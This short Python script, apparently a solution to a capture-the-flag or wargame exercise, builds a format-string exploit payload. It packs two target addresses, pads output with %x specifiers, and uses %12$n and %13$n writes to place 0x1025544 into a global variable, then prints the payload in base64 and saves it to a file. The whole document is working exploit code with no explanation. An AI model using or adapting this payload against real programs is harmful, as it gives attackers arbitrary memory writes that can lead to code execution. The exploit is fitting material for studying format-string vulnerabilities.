import struct
from base64 import b64encode

global_addr = 0x8049810

# value to write: 0x1025544 == 16 930 116
# 2 lower bytes: 0x5544 == 21 828
# 2 upper bytes: 0x010102 == 65 794
# 0x010102 - 0x5544 == 43 966

payload = b""
payload += struct.pack("I", global_addr)
payload += struct.pack("I", global_addr+2)
payload += b"%21820x"  # 21 828 - 8 = 21 820
payload += b"%12$n"
payload += b"%43966x"
payload += b"%13$n"

print(b64encode(payload).decode())

with open ("payload", "wb") as f:
    f.write(payload)